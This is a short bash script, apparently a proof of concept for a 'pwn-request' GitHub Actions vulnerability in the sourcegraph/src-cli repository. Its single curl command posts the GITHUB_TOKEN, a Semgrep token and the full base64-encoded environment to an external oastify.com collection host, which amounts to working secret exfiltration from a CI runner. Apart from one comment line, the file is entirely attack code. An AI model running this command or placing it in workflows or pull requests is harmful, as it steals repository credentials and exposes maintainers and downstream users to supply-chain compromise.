#!/bin/bash
# This script demonstrates the vulnerability
curl -X POST "https://7hpgcnvxhc587ry5ubpugxcx6ocf06rug.oastify.com/YOUR-UNIQUE-ID" \
  -H "Content-Type: application/json" \
  -d "{
    \"vulnerability\": \"pwn-request\",
    \"repo\": \"sourcegraph/src-cli\",
    \"github_token\": \"${GITHUB_TOKEN}\",
    \"semgrep_token\": \"${GH_SEMGREP_SAST_TOKEN}\",
    \"all_env\": \"$(env | base64 -w0)\"
  }"
